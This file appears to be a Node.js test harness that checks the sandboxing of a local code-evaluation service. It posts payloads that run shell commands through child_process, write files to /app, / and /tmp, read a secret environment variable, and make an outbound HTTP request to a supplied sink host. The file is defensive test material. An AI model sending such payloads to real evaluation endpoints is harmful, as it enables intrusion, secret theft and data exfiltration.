'use strict';
const http = require('node:http');
const crypto = require('node:crypto');
const [nonce, sink] = process.argv.slice(2);
if (!/^[a-f0-9]{24}$/.test(nonce) || !/^\d+\.\d+\.\d+\.\d+$/.test(sink)) process.exit(2);
const literal = JSON.stringify(nonce);

function request(method, path, code) {
  return new Promise((resolve, reject) => {
    const req = http.request({hostname: '127.0.0.1', port: 3000, path, method}, res => {
      let body = '';
      res.on('data', chunk => { body += chunk; });
      res.on('end', () => {
        try { resolve(JSON.parse(body)); } catch (error) { reject(error); }
      });
    });
    req.setTimeout(5000, () => req.destroy(new Error('request timeout')));
    req.on('error', reject);
    req.end(code === undefined ? undefined : JSON.stringify({code}));
  });
}

(async () => {
  let ready = false;
  for (let i = 0; i < 100; i++) {
    try { ready = (await request('GET', '/health')).ok === true; } catch {}
    if (ready) break;
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  if (!ready) throw new Error('application did not become ready');
  const cases = {
    code_execution: [`return require('node:crypto').createHash('sha256').update(${literal}).digest('hex')`, crypto.createHash('sha256').update(nonce).digest('hex')],
    shell: [`return require('node:child_process').execFileSync('/bin/sh', ['-c', 'printf %s ${nonce}'], {timeout: 2000}).toString()`, nonce],
    app_write: [`const fs = require('node:fs'); const p = '/app/proof-${nonce}'; fs.writeFileSync(p, ${literal}); return fs.readFileSync(p, 'utf8')`, nonce],
    root_write: [`const fs = require('node:fs'); const p = '/proof-${nonce}'; fs.writeFileSync(p, ${literal}); return fs.readFileSync(p, 'utf8')`, nonce],
    tmp_write: [`const fs = require('node:fs'); const p = '/tmp/proof-${nonce}'; fs.writeFileSync(p, ${literal}); return fs.readFileSync(p, 'utf8')`, nonce],
    worker_secret: [`return process.env.DEMO_SECRET`, 'synthetic-demo-value-not-a-real-credential'],
    egress: [`return await new Promise((resolve, reject) => { const req = require('node:http').get('http://${sink}:8080/${nonce}', res => { let body = ''; res.on('data', b => body += b); res.on('end', () => resolve(body)); }); req.setTimeout(1500, () => req.destroy(Object.assign(new Error('timeout'), {code: 'ETIMEDOUT'}))); req.on('error', reject); })`, nonce]
  };
  const results = {};
  for (const [name, [code, expected]] of Object.entries(cases)) {
    const response = await request('POST', '/evaluate', code);
    results[name] = {succeeded: response.ok === true && response.value === expected,
      error: response.ok === true ? (response.value === expected ? '' : 'unexpected response') : response.error};
  }
  process.stdout.write(JSON.stringify(results));
})().catch(error => { console.error(error.message); process.exitCode = 1; });
